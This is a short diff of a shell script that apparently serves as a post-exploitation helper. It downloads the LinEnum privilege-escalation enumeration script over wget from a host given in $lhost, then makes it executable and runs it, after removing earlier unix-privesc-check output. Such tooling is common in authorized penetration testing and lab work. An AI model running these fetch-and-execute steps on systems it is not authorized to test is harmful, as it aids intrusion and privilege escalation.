@@ -19,12 +19,11 @@ rm unix-privesc-check.sh ; rm unix-privesc-check.txt
 
 which wget ; which curl
 read -p "wget or curl ? > " input
-curdir=$(pwd)
 
 if [ $input =  "wget" ] ; then
    set -x
 ##### LinEnum Section #######
-   cd curdir
+   cd $(pwd)
    wget http://"$lhost":80/linux/script/LinEnum.sh
    chmod 700 LinEnum.sh
    ./LinEnum.sh > LinEnum.txt 2>&1
